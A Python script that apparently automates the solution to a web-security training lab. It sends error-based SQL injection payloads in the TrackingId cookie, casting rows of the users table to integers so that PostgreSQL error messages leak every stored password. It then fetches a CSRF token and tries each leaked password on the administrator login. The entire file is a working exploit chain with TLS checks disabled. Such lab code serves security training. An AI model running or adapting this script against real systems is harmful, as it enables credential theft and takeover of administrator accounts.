from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import argparse
import requests
import urllib3
import string
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", action="store_true")
    return parser.parse_args()


def print_info(string, end="\n"):
    print(f"\r\033[1;94m[*]\033[00m {string}", end=end)


def print_success(string, end="\n"):
    print(f"\r\033[1;92m[+]\033[00m {string}", end=end)


def print_fail(string):
    print(f"\r\033[1;91m[-]\033[00m {string}")
    exit(1)


def verify_lab_accessible(url):
    print_info("Checking if given URL is accessible...")
    resp = requests.get(url)
    if resp.status_code != 504:
        print_success("URL is accessible.\n")
    else:
        print_fail("URL is inaccessible. Reopen the lab and use new URL.")


def verify_lab_solved(url):
    print_info("Revisiting URL to verify if attack was successful...")
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    if soup.select_one("#notification-labsolved"):
        print_success("Attack successful. Lab solved.")
    else:
        print_fail("Lab unsolved. Ensure...")


def solve_lab(url, proxies):
    print_info(f'Extracting passwords by visiting "{url}" with the following cookies:')
    print(
        '{"TrackingId": "\' OR (SELECT password FROM users LIMIT 1 OFFSET \033[1;93m?\033[00m)::int=1 --"}'
    )

    passwords = []
    regex = re.compile('ERROR: invalid input syntax for type integer: "(.*)"')
    while True:
        cookies = {
            "TrackingId": f"' OR (SELECT password FROM users LIMIT 1 OFFSET {len(passwords)})::int=1 --"
        }
        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)

        soup = BeautifulSoup(resp.text, "html.parser")
        match = soup.find(string=regex)

        if match is None:
            print_info(f"{len(passwords)} => None")
            break
        else:
            password = re.match(regex, match).group(1)
            print_info(f"{len(passwords)} => {password}")
            passwords.append(password)

    if len(passwords) == 0:
        print_fail("Unable to extract any passwords")
    else:
        print_success(f"Successfully extracted {len(passwords)} passwords\n")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    print_info("Attempting to log in as administrator using extracted passwords...")
    for password in passwords:
        data = {"csrf": csrf, "username": "administrator", "password": password}
        resp = s.post(
            url,
            proxies=proxies,
            verify=False,
            data=data,
        )

        soup = BeautifulSoup(resp.text, "html.parser")
        invalid = soup.find(string="Invalid username or password.")

        if invalid:
            print_info(f"{password} => {invalid}")
        else:
            print_success(f"{password} => Success\n")
            break
    else:
        print_fail("Failed to log in as administrator")


def main():
    args = get_args()
    root_url = urljoin(args.url, "/")

    verify_lab_accessible(root_url)

    proxies = None
    if args.use_proxy:
        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
        print_info('Using "http://127.0.0.1:8080" as a proxy')

    solve_lab(root_url, proxies)
    verify_lab_solved(root_url)


if __name__ == "__main__":
    main()
